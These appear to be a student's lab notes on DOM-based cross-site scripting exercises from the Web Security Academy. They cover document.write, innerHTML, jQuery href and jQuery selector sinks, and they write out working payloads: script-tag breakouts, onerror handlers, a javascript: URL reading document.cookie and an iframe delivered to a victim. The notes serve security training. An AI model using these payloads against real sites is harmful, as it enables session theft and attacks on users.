## dom
### document.write
```
# view-source / inspect element
# see that my search string ends up in <img> tag:

<img src="/resources/images/tracker.gif?searchTerms=adsf" q7yoldkbi="">

# adjust search string to inject xss via <img> tag

sadf"><script>alert(1)</script>
```

### innerHTML
```
# view-source / inspect element
# see that my search string ends up in <span> tag:

<span id="searchMessage">fake</span>

# break out
# key: force an error to trigger "onerror"

<img src=1 onerror=alert(1)>
<audio src/onerror=alert(2)>

# other key notes: it's totally ok to inject javascript as-is into <span> tags
```

### jQuery href
```
# see that '/feedback?returnPath=/' returns HTTP response with "src" calling "jquery":

<script src="/resources/js/jquery_1-8-2.js"></script>
<div class="is-linkback">
	<a id="backLink">Back</a>
</div>
<script>
	$(function() {
		$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
	});
</script>

# see that a <href> tag is being built, using the input passed to "returnPath"
# try inject random chars to "returnPath":

/feedback?returnPath=asdf

# see that the resulting "Back" link leads to:

https://0af3007a032c23bcc10958b000a10065.web-security-academy.net/asdf

# now inject 

/feedback?returnPath=javascript:alert(document.cookie) 

# now the "Back" link simply reads:

javascript:alert(document.cookie)

# note: this uses the `javascript:` protocol to run text as JavaScript instead of opening it as a normal link
# sauce: https://riptutorial.com/html/example/2120/link-that-runs-javascript
```

### jQuery `$()` selector
```
# vulnerable portion:

<script src="/resources/js/jquery_1-8-2.js"></script>
<script src="/resources/js/jqueryMigrate_1-4-1.js"></script>
<script>
	$(window).on('hashchange', function(){
		var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
		if (post) post.get(0).scrollIntoView();
	});
</script>

# exploit via iframe (deliver to victim):

<iframe src="https://0a8200b703a078abc312925a0003009d.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

# test that "print()" does get called when this payload runs normally
# now deliver the payload
```
